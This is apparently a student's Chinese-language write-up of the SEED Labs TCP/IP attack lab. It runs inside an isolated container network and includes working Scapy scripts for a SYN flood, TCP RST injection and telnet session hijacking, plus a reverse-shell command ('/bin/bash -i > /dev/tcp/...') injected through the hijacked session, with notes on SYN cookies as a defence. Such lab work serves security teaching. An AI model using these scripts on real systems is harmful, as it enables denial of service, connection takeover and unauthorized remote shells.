---
title: TCP/IP-Attack-Lab
categories:
  - SeedLabs/NetworkSecurity
tags:
  - SYN Flood Attack
  - TCP Session Hijacking
  - NetworkSecurity
abbrlink: e4a80771
date: 2024-03-24 00:18:52
---

## Overview

TCP/IP 协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞。它们提供了一个宝贵的经验教训， 说明安全性应该从一开始就设计，而不是事后添加。此外，研究这些漏洞有助于学生理解网络安全的挑战，以及为什么需要许多网络安全措施。本次实验包括如下主题：

-   TCP 协议
-   TCP SYN 洪泛攻击和 SYN cookies
-   TCP 重置攻击
-   TCP 会话劫持
-   反向 shell

## Lab Environment

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/FGrDbbHs9o7J0Bxk2uBczz6wnLh.png)

其中 Attacker 中配置了共享文件夹和主机模式；在所有的容器中创建了 一个叫做 seed 的帐户。它的密码是 dees。可以使用 Telnet 远程登录这个帐户。

## Task 1: SYN Flooding Attack

SYN 洪泛攻击是 DoS 攻击的一种形式，攻击者向受害者的 TCP 端口发送许多 SYN 请求，但攻击者攻击者要么使用伪造的 IP 地址，要么不继续这个过程，并不完成三次握手。这样，大量的半开放连接（完成了第一第二步握手，还没有完成第三步）填充满了队列，导致受害者不能再接受任何连接。

这个队列的大小在 Ubuntu 系统中可以通过如下命令来查看，系统内存越大，这个值也就越大。在我的容器中，这个值是 128 。

```bash
sysctl net.ipv4.tcp_max_syn_backlog
```

我们可以使用 netstat -nat 命令查看队列的使用情况，即状态为 SYN-RECV 的连接，如果完成第三次握手，那么连接状态将是 ESTABLISHED。

SYN Cookie 对策：默认 Ubuntu 是打开的，我们在配置文件中使用如下指令将其关闭了。可以使用注释命令修改并查看它。为了能够使用 sysctl 更改容器中的系统变量，需要将容器配置为 “privileged: true”。

```bash
sysctls:
    - net.ipv4.tcp_syncookies=0
    
# sysctl -a | grep syncookies (Display the SYN cookie flag) 
# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie) 
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
```

### Task 1.1: Launching the Attack Using Python

编写如下的代码，在 Attacker 上执行：

```python
#!/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S') # telnet 使用的是端口 23；发送 SYN 包
pkt = ip/tcp

while True:
    # 随机 IP 地址，随机端口，随机 seq 值
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)  # source port
    pkt[TCP].seq = getrandbits(32)  # sequence number
    send(pkt, verbose=0)
```

执行结果如下，我们发现，队列只能使用 97 左右，而且数量并不稳定。而 Host 主机还是可以连接上 Victim 主机，这说明我们的攻击失败了。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/QiAvbnKQdo71rMxuDp8cbTNOncf.png)

可能的原因：

- TCP 缓存问题：这是一个内存缓解机制，如果 SYN Cookies 被禁用，那么 TCP 会保留 1/4 的队列用于之前已经认证过的地址，这就是为什么我们发现半连接最多只有 97 左右。因为可能之前存在缓存，故 Host 还是可以连接上 Victim。`ip tcp_metrics show` 可以查看缓存，`ip tcp_metrics flush` 可以清空缓存。
- TCP 重传问题：在服务器发送 SYN+ACK 后，如果超时了，就会重传数据包，达到重传次数后，就会在队列中删除这个半连接。然后攻击数据包就会和合法的 telnet 数据包而战。`sysctl net.ipv4.tcp_synack_retries` 可以查看重传次数。
- 队列的大小也有影响，使用  `sysctl -w net.ipv4.tcp_max_syn_backlog=80` 可以修改大小。
- 如果使用的是虚拟机，那么受害者发送的 SYN+ACK 包会发送给 NAT 转发，但是 NAT 中没有对应的条目（因为是随机构造的），那么 NAT 会发送 TCP RST 数据包给受害者，删除队列中的记录。

因此，我将攻击程序改成 8 线程同时执行，将队列大小修改为 80，并清空了 TCP 缓存后，执行 telnet 连接，连接不上，攻击成功。攻击的越快、队列越小，攻击的成功率就越高。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/Bqlpb3dFKoy6Wtxtp3FcO7q8n1g.png)

### Task 1.2: Launch the Attack Using C

不需要减少队列，不需要多线程，攻击成功。因为 C 就是比 Python 快，攻击越快，成功率越高。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/Bh8bbfEvuoSH10xO93Tc8jCjncb.png)

### Task 1.3: Enable the SYN Cookie Countermeasure

开启后，发现在攻击时，不会保留 1/4 的队列大小了，全部队列被半连接占满。但是，在 Host 通过 telnet 连接 Victim 时，秒连，没有延时。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/Icdjb6lyEozYctxtzwKc77iOn8c.png)

SYN cookie 是一种用于防范 SYN 攻击的网络安全机制。在传统的 TCP 握手过程中，服务器在收到客户端发送的 SYN 报文（建立连接请求）时，会为该连接分配资源并发送一个 SYN-ACK 报文给客户端，等待客户端发送 ACK 报文以完成连接建立。在 SYN 攻击中，攻击者发送大量伪造的 SYN 报文给服务器，占用服务器资源并导致服务不可用。

为了应对 SYN 攻击，SYN cookie 机制被提出。当服务器启用 SYN cookie 机制后，它会延迟分配资源，而是根据客户端发送的 SYN 报文计算一个加密的 Cookie 值作为序列号，并将该 Cookie 值发送给客户端。当客户端发送 ACK 报文时，服务器可以通过解密 Cookie 值来还原序列号，建立连接并验证客户端的身份。

通过使用 SYN cookie 机制，服务器可以在不分配资源的情况下响应连接请求，有效地抵御 SYN 攻击。这种机制可以帮助服务器在面临大规模 SYN 攻击时保持可用性，并减少对网络和系统资源的消耗。SYN cookie 机制在一定程度上改变了 TCP 连接建立的方式，提高了网络的抗攻击能力。

## Task 2: TCP RST Attacks on telnet Connections

主机 A 发送一个带有 RST 标志的 TCP 数据包给主机 B，表示要立即终止连接。

不妨假设是 Host 通过 telnet 连接 Victim。然后我们在主机上嗅探数据包，如果是 Host 发出的 TCP 包，我们就捕获它，并将其 flag 修改为 RST，然后再发出去，这样 Victim 收到了一个 RST 的数据包，就会断开连接。seq 的值需要保持在接收方的窗口范围内，故我们捕获的到 seq=x 时，我们可以认为 x 在窗口内，但是可能这个数据包就是要被确认的，而数据只有一个字符，所以这里我们加 1 比较妥当。

```python
from scapy.all import *

def packet_handler(packet):
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst
    src_port = packet[TCP].sport
    dst_port = packet[TCP].dport
    tcp_seq = packet[TCP].seq
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port, flags="R", seq=tcp_seq+1)
    pkt = ip/tcp
    send(pkt, verbose=0)

# 开始嗅探来自 Host 的数据包
sniff(iface="br-afeab2d608d9",
      filter="tcp and ether src 02:42:0a:09:00:06", prn=packet_handler)
```

首先在 Host 上连接 Victim，然后发送 he，正常显示没有问题。接下来，在主机上执行上述程序，输入 l，这个字符回显了，再显示的断开连接。回显是因为我们并没有执行中间人攻击，所以该通信的还是会通信。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/W934bCxKOoEyqkxqxJYcXcSln3d.png)

## Task 3: TCP Session Hijacking

在下面这份代码中，我们嗅探到了客户端发送给服务端的一个数据包，根据 telnet 的工作原理，我们不妨假设这个数据包发送的数据是 a，其 seq 值为 x，然后我们伪造一个新的数据包，也是客户端发送给服务端的，seq 的值为 x+1，这样，在服务端接收了 x 的数据后，就会接收 x+1 处的数据。当然了，我们也可以使用 x+10，那么当客户端发送了 10 个字符后，服务端接收了这 10 个字符，就会处理伪造数据包发送过去的字符（滑动窗口，前面的都收到了后面的才会真正接收）。

我们在 data 中的第一个字符是换行，这样就不会和前面的字符产生冲突了。否则前面假如输入的是 a，那么拼接起来执行的就是 aecho 命令了。最后换行表示命令结束。

```python
from scapy.all import *

def packet_handler(packet):
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst
    src_port = packet[TCP].sport
    dst_port = packet[TCP].dport
    tcp_seq = packet[TCP].seq
    tcp_ack = packet[TCP].ack
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port,
              flags="A", seq=tcp_seq+1, ack=tcp_ack)
    data = "\recho \"ceyewan\" > hijacking.out\n\0"
    pkt = ip/tcp/data
    send(pkt, verbose=0)

# 开始嗅探数据包
sniff(iface="br-afeab2d608d9",
      filter="tcp and ether src 02:42:0a:09:00:06", prn=packet_handler)
```

在执行完 pwd 指令后我们在执行上述代码，发现键入 a 后就无法输入了，在 Victim 上发现攻击成功。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/ZLCKbgizSoEpTJx8wTGcmrhCnX3.png)

攻击者注入的数据打乱了客户端和服务器之间的序列号。当服务器回复欺骗包时，确认域中存放的是攻击者给出的序列号加上有效载荷的长度，但对于客户端来说，因为还没有达到这个序列号，所以它会认为这个回复是无效的，因此会丢弃这个回复包，当然也不会确认收到了该包。如果回复未被确认，服务器会认为这个回复包丢失了，就会一直重发这个包。

而这个包又会一直被客户端丢弃。另一方面，当在客户端的 telnet 程序中输入一些内容时，客户端发出的包使用的序列号已经被攻击包使用了，因此服务器会视这些数据为重复数据，不予理睬。由于得不到任何确认，客户端将会持续地重发这些数据。基本上，客户端和服务器将会进入死锁状态，并且一直发送数据给对方并丢掉来自对方的数据。一段时间后，TCP 将会断开连接。

## Task 4: Creating Reverse Shell using TCP Session Hijacking

- 在攻击者机器上执行 `nc -lnv 9090`，它使用 nc 工具在端口 9090 上监听连接。这个命令会在本地主机上启动一个 nc 进程，用于监听来自其他计算机或设备的连接请求。参数 -l 表示监听模式，-n 表示不使用 DNS 解析，-v 表示输出详细信息。9090 是指定的端口号，表示监听在 9090 端口上。
- 我们要让受害者机器执行  `/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1`，其中：

    - `/bin/bash -i` 代表 interactive，意思是 shell 必须是交互的
    - `>`` ``/dev/tcp/10.9.0.1/9090` 表示将输出重定向到 TCP 连接
    - `0<&1` 表示输入也来自 TCP 连接
    - `2>&1` 表示 stderr 也被重定向到了 TCP 连接

和 Task 3 差不多，把 data 里面的命令换成上面的命令就可以了。

![](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/CBlHbChkfoe0N4xbdZNcnW4Nn8b.png)